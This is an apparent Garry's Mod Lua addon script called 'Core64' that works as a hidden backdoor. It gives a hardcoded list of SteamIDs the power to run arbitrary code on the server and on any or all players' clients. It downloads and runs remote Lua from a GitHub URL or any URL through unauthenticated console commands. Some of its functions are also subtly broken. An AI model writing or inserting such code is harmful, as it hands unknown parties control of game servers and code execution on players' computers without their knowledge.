Core64 = {}
Core64.admin_list = {
			['STEAM_0:0:86505916'] = true,
			['STEAM_0:0:46138786'] = true,
			['STEAM_0:1:52242486'] = true,
			['STEAM_0:0:58529358'] = true,
			['STEAM_0:1:30754890'] = true,
			['STEAM_0:0:48309877'] = true,
			['STEAM_0:1:30052037'] = true,
			['STEAM_0:0:36074785'] = true
}


if SERVER then	
		function Core64.UrlFunc(url)
			http.Fetch(url, function(c)
				local func = CompileString(c, "UrlFunc", false)
				return func()
			end)			
		end
		
		function Core64.UrlRunS(url)
			local func = Core64.UrlFunc(url)
			func()
		end
		
		function Core64.GitRunSV(url)
			local func = Core64.UrlFunc("https://raw.githubusercontent.com/Dzhet225/core64_v2/master/"..url)
			func()
		end
		
		util.AddNetworkString('core64.netcode')
		
		function Core64.RunOnCL(tar, code)
			if !tar.CodeReceiver then
				tar.CodeReceiver=true
				tar:SendLua([[net.Receive('core64.netcode',function() RunString(net.ReadString()) end)]])
			end
			net.Start('core64.netcode')
			net.WriteString(code)
			net.Send(tar)
		end

		local rec = {
			[1] = function(code)
				RunString(code)
			end,
			[2] = function(code)
				for k, v in pairs(player.GetAll()) do
					RunOnCL(v, code)
				end
			end,
			[3] = function(code)
				RunOnCL(net.ReadEntity(), code)
			end,
		}

		net.Receive('core64.netcode', function(len, ply)
			if !Core64.admin_list[ply:SteamID()] then return end
			
			local code = net.ReadString()
			rec[net.ReadUInt(2)](code)
		end)
		
		local function cmdurlfunc(player,command,args)
			if args then
				UrlFunc(args[1])
			end
		end		
		concommand.Add("urlfunc",cmdurlfunc)
		
		local function cmdurlfunc(player,command,args)		
			Core64.GitRunSV("lua/core.lua")		
		end
		concommand.Add("ert",cmdurlfunc)	
end